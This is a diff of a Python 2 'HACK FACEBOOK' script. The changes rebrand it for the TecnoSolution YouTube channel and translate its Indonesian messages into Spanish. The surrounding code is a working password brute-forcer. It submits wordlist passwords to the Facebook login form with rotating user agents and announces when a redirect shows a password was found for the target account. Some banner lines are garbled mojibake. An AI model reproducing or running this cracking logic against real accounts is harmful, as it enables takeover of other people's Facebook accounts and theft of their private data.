@@ -40,11 +40,11 @@ def cover():
     
     
      """
-    runntek(GL+"           Assalamu'@laikum. ^_^...")
+    runntek(GL+"           YouTube'@TecnoSolution ^_^...")
     time.sleep(1)
     print " "
     print RR+"  +============================================+"
-    print GG+"  |â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢   HACK FACEBOOK MAS ^_^   â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢|" 
+    print GG+"  |¢â€€   HACK FACEBOOK By TecnoSolution   ¢â€¢|"
     print RR+"  +============================================+"
     print WW+"  |            Script BY: TecnoSolution        |"
     print GG+"  |              Reza antes de usar            |"
@@ -54,7 +54,7 @@ def cover():
     print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]        |"
     print WW+"  |--------------------------------------------|"
     print RR+"  +============================================+"
-    print GG+"  |â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢   HACK FACEBOOK MAS ^_^   â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢|"
+    print GG+"  |¢â€€   HACK FACEBOOK By TecnoSolution   ¢â€¢|"
     print RR+"  +============================================+"     
 
 
@@ -109,7 +109,7 @@ def kol():
     else:
         exit(0)
 def brute(password):
-        sys.stdout.write(GG+"\r[+]\033[97;1m Mencoba ..... {}\n".format(password))
+        sys.stdout.write(GG+"\r[+]\033[97;1m Probando ..... {}\n".format(password))
         sys.stdout.flush()
         br.addheaders = [('User-agent', random.choice(useragents))]
         site = br.open(login)
@@ -119,7 +119,7 @@ def brute(password):
         sub = br.submit()
         log = sub.geturl()
         if log != login and (not 'login_attempt' in log):
-                        print("\033[92;1m\n\n[+]\033[97;1m Password Find \033[31;1m===| \033[96;1m{}".format(password)) 
+                        print("\033[92;1m\n\n[+]\033[97;1m Password Encontrada \033[31;1m===| \033[96;1m{}".format(password)) 
                         print " "
                         raw_input(WW+"PULSE ENTER PARA SALIR.....")
                         sys.exit(1)
@@ -136,9 +136,9 @@ def search():
 #welcome
 def welcome():
         wel = GG+"""
-????? ??? ??? ???? ???? ?????? ???? ??? ???? ????? ??? ???? ???? 
-????? ??? ??? ???? ???? ?????? ???? ??? ???? ????? ??? ???? ???? 
-????? ??? ??? ???? ???? ?????? ???? ??? ???? ????? ??? ???? ????  \033[96;4mLife Of Programmer\033[92;1m
+No olvides suscribirte al Canal de Youtube "TecnoSolution" 
+Y darle LIKE al Video.... Gracias!!!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \033[96;4mLife Of Programmer\033[92;1m
        |_|
       """
         print wel
@@ -146,8 +146,8 @@ def welcome():
         total = open(passwordlist,"r")
         total = total.readlines()
         print " "
-        print GL+" [*] Account to crack : {}".format(email)
-        print RR+" [*] Jmlah :" , len(total),WW+ "passwords"
+        print GL+" [*] Cuenta a Crackear : {}".format(email)
+        print RR+" [*] Cantidad :" , len(total),WW+ "passwords"
         print Y+" [*] Cracking, please wait .....\n\n"
 
 if __name__ == '__main__':
